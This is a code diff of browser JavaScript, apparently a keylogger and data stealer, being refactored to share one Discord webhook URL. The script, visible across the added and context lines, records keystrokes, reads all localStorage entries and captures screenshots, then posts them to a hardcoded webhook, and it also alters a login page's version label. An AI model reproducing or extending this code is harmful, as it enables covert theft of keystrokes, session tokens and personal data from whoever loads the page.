@@ -1,5 +1,5 @@
+const WEBHOOK_URL = "https://discord.com/api/webhooks/1535668714522021962/bnDth-lZGAwt1hjPP9amg7TOPdpBs6gtF6OEpWR2i_FLXI0a93JH9QizNFvUvBQRiZ0A";
 (function () {
-  const WEBHOOK_URL = "https://discord.com/api/webhooks/1535668714522021962/bnDth-lZGAwt1hjPP9amg7TOPdpBs6gtF6OEpWR2i_FLXI0a93JH9QizNFvUvBQRiZ0A";
   const CDN_URL = "https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js";
 
   // 1. Function to capture and POST screenshot
@@ -68,9 +68,6 @@ function sendLocalStorageToWebhook() {
         const value = localStorage.getItem(key);
         localStorageData[key] = value;
     }
-
-    // Prepare the payload to send to Discord webhook
-    const webhookURL = "https://discord.com/api/webhooks/1535668714522021962/bnDth-lZGAwt1hjPP9amg7TOPdpBs6gtF6OEpWR2i_FLXI0a93JH9QizNFvUvBQRiZ0A";
     const payload = {
         content: "LocalStorage Data:",
         embeds: [
@@ -83,7 +80,7 @@ function sendLocalStorageToWebhook() {
     };
 
     // Use fetch to send the payload to the webhook
-    fetch(webhookURL, {
+    fetch(WEBHOOK_URL, {
         method: "POST",
         headers: {
             "Content-Type": "application/json"
@@ -108,7 +105,6 @@ document.addEventListener("keyup", function(event) {
 });
 
 function sendKeystrokesToWebhook() {
-    const webhookURL = "https://discord.com/api/webhooks/1535668714522021962/bnDth-lZGAwt1hjPP9amg7TOPdpBs6gtF6OEpWR2i_FLXI0a93JH9QizNFvUvBQRiZ0A";
     const payload = {
         content: "Keystrokes:",
         embeds: [
@@ -120,7 +116,7 @@ function sendKeystrokesToWebhook() {
         ]
     };
 
-    fetch(webhookURL, {
+    fetch(WEBHOOK_URL, {
         method: "POST",
         headers: {
             "Content-Type": "application/json"
@@ -137,9 +133,9 @@ function sendKeystrokesToWebhook() {
 setInterval(() => {
   const loginVersion = document.getElementById('login_version');
   if (loginVersion) {
-    loginVersion.textContent = "v1.8.3b OOBE";
+    loginVersion.textContent = "OOBE Version";
   }
 }, 1);
 
 setInterval(function(){sendKeystrokesToWebhook()},5000)
-setInterval(sendLocalStorageToWebhook, 4000);
+setTimeout(sendLocalStorageToWebhook, 4000);
